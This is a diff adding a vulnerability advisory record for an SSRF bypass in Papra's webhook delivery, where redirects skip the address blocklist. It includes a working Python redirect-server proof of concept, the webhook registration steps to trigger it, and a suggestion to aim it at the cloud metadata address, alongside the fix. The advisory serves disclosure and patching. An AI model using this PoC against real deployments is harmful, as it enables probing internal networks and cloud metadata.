@@ -1,0 +1,183 @@
+advisory_id: GHSA-5g86-85rp-f9hx
+datasource_id: github_osv/GHSA-5g86-85rp-f9hx
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-5g86-85rp-f9hx/GHSA-5g86-85rp-f9hx.json
+aliases:
+  - CVE-2026-48051
+summary: |
+  Papra HTTP redirect bypass can lead to SSRF via webhook delivery system
+  ### Summary
+
+  Papra's webhook delivery system contains an SSRF protection bypass that allows any authenticated organisation member to cause the server to make HTTP requests to internal addresses — loopback, link-local, and RFC-1918 ranges. The SSRF protection validates the registered webhook URL but ignores redirect destinations. The HTTP client (`ofetch`) follows 3xx responses automatically, and the redirect target is never checked against the blocklist. An attacker registers a webhook pointing to an attacker-controlled server, which redirects incoming POSTs to any internal address. Exploitation was confirmed by live test against the official Docker image. The fix is a single-line change to the webhook HTTP client.
+
+  ### Details
+
+  **The vulnerable call**
+
+  The webhook HTTP client in `packages/webhooks/src/webhooks.services.ts` (lines 16–19) calls `ofetch.raw()` without specifying a `redirect` option:
+
+  ```typescript
+  const response = await ofetch.raw<unknown>(url, {
+    ...options,
+    ignoreResponseError: true,
+    // no `redirect` option — defaults to 'follow' per Fetch API spec
+  });
+  ```
+
+  `ofetch` is a thin wrapper around the WHATWG Fetch API. The Fetch specification defines three redirect modes — `follow`, `error`, and `manual` — and sets `follow` as the default. In `follow` mode, the HTTP implementation resolves the redirect chain internally and returns only the final response; application code receives the terminal response with no indication that any redirects occurred. `ofetch` 1.4.1 does not set a `redirect` option in its internal `fetch()` call, so the default applies. The `ignoreResponseError: true` option only suppresses exceptions on non-2xx responses; it has no effect on redirect handling.
+
+  **How the bypass works**
+
+  The SSRF protection runs at two points: registration time (`checkWebhookUrlIsSsrfSafe`, `webhooks.usecases.ts:34`) and delivery time (`filterOutSsrfUnsafeWebhooks`, `webhooks.usecases.ts:124`). Both checks work the same way:
+
+  ```typescript
+  // apps/papra-server/src/modules/shared/ssrf/ssrf.services.ts, lines 20-27
+  const hostname = getUrlHostname(url);
+  return isHostnameSsrfSafe({ hostname, allowedHostnames, dnsLookup, logger });
+  // Resolves hostname → checks all resulting IPs against the blocklist
+  // Blocklist covers: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16,
+  //                   169.254.0.0/16, ::1, and other reserved ranges
+  ```
+
+  Both checks operate on `url` — the registered webhook URL, a public hostname that resolves to a public IP and passes the blocklist. Neither check has any visibility into where the HTTP client will end up after following a redirect. The `Location` header in a 3xx response is never extracted, never DNS-resolved, and never compared against the blocklist. By the time the redirect target is known to the Fetch implementation, the request has already been made.
+
+  The developer cannot observe this gap. The Fetch API gives no opportunity to inspect the redirect target before following it.
+
+  **Evidence**
+
+  Attacker's redirect server receives the POST and returns 302:
+
+  ```
+  [2026-05-08T15:55:38.388647] POST /redirect
+    User-Agent: papra-webhook-client    ← set only in webhooks.services.ts:47
+    X-Forwarded-For: <REDACTED>
+  "POST /redirect HTTP/1.1" 302 -
+  ```
+
+  Papra's inbound request log immediately after — this is the server logging a request arriving at itself:
+
+  ```
+  {"message":"Request completed","timestampMs":1778255738420,
+   "data":{"status":200,"method":"GET","path":"/api/health",
+           "userAgent":"papra-webhook-client"}}   ← outbound UA on an inbound request
+  ```
+
+  `papra-webhook-client` is set exclusively by the outbound webhook delivery code (`webhooks.services.ts:47`). Its presence on an inbound log entry is only possible if Papra's own HTTP client followed the 302 and made a request to the loopback. The delivery record confirms the internal endpoint responded HTTP 200:
+
+  ```
+  {"message":"Webhook triggered","timestampMs":1778255738422,
+   "data":{"responseStatus":200,"webhookId":"wbh_s6t1xzezbzbivyhptcs7qxhk"}}
+  ```
+
+  ### PoC
+
+  1. Start `redirect_server.py` on a publicly reachable server (ngrok free tier is sufficient). The example below uses Papra's own health endpoint as the redirect target to demonstrate the bypass — in a cloud environment replace `REDIRECT_TARGET` with `http://169.254.169.254/latest/meta-data/` or any internal address.
+
+  ```python
+  from http.server import HTTPServer, BaseHTTPRequestHandler
+  from socketserver import ThreadingMixIn
+  import datetime
+
+  REDIRECT_TARGET = "http://127.0.0.1:1221/api/health"  # replace with desired internal target
+
+  class RedirectHandler(BaseHTTPRequestHandler):
+      def do_POST(self):
+          content_len = int(self.headers.get("Content-Length", 0))
+          body = self.rfile.read(content_len)
+          print(f"[{datetime.datetime.now(datetime.timezone.utc).isoformat()}] POST {self.path}")
+          print(f"  User-Agent: {self.headers.get('User-Agent')}")
+          print(f"  Body: {body[:200]}")
+          self.send_response(302)
+          self.send_header("Location", REDIRECT_TARGET)
+          self.end_headers()
+
+  class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+      pass
+
+  if __name__ == "__main__":
+      server = ThreadedHTTPServer(("0.0.0.0", 9999), RedirectHandler)
+      print("Redirect server running on port 9999")
+      server.serve_forever()
+  ```
+
+  > `ThreadingMixIn` is required — Papra immediately opens a second connection to the same port when following the redirect; a single-threaded server deadlocks.
+
+  2. Register a webhook pointing to the redirect server:
+     ```
+     POST /api/organizations/{orgId}/webhooks
+     {"name":"ssrf-test","url":"https://{ngrok-url}/redirect","events":["document:created"]}
+     ```
+  3. Upload any document to the organisation to fire a `document:created` event.
+  4. Confirm on the Papra server logs that `/api/health` received a GET request with `User-Agent: papra-webhook-client`.
+
+  ### Impact
+
+  - Any authenticated org member (no admin role required) can trigger the exploit.
+  - The Papra server makes HTTP requests to internal addresses blocked by its own SSRF list: `127.0.0.0/8`, `169.254.0.0/16`, RFC-1918 ranges.
+  - **This is blind SSRF** — internal response bodies are written to `webhook_deliveries` but no API route exposes delivery records. Response content is not accessible to the attacker through the Papra API.
+  - Internal network topology can be partially inferred from whether requests succeed or fail (closed port produces a network error; open port returns an HTTP response).
+  - HTTP 307 redirects preserve the POST method and body, enabling state-changing requests to internal services that accept unauthenticated POSTs.
+  - On cloud deployments (AWS, GCP, Azure), the instance metadata service at `169.254.169.254` is reachable by the same technique. Cloud IMDS was not tested in this PoC (local Docker environment, no metadata service present). Response exfiltration via the Papra API remains unavailable regardless.
+
+  **Suggested Fix**
+
+  Add `redirect: 'manual'` to the `ofetch.raw()` call in `packages/webhooks/src/webhooks.services.ts` (line 16) and treat any 3xx response as a delivery failure. Webhook endpoints have no legitimate reason to redirect:
+
+  ```typescript
+  const response = await ofetch.raw<unknown>(url, {
+    ...options,
+    redirect: 'manual',       // do not follow redirects
+    ignoreResponseError: true,
+  });
+  ```
+
+  If redirect-following is ever required in the future, validate the `Location` header through the existing `isUrlSsrfSafe()` check before re-issuing the request.
+impacted_packages:
+  - purl: pkg:npm/%40papra/webhooks
+    affected_versions: vers:npm/<0.3.3
+    fixed_versions: vers:npm/0.3.3
+    affected_packages:
+      - pkg:npm/%40papra/webhooks@0.0.1
+      - pkg:npm/%40papra/webhooks@0.1.0
+      - pkg:npm/%40papra/webhooks@0.1.1
+      - pkg:npm/%40papra/webhooks@0.2.0
+      - pkg:npm/%40papra/webhooks@0.3.0
+      - pkg:npm/%40papra/webhooks@0.3.1
+      - pkg:npm/%40papra/webhooks@0.3.2
+    fixed_packages:
+      - pkg:npm/%40papra/webhooks@0.3.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/papra-hq/papra
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/papra-hq/papra
+        commit: 086dccbfda18c850bee50b94c48f5f110be6935c
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '3.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-5g86-85rp-f9hx/GHSA-5g86-85rp-f9hx.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/papra-hq/papra
+    reference_type:
+    reference_id:
+  - url: https://github.com/papra-hq/papra/commit/086dccbfda18c850bee50b94c48f5f110be6935c
+    reference_type:
+    reference_id:
+  - url: https://github.com/papra-hq/papra/security/advisories/GHSA-5g86-85rp-f9hx
+    reference_type:
+    reference_id:
+exploits: []
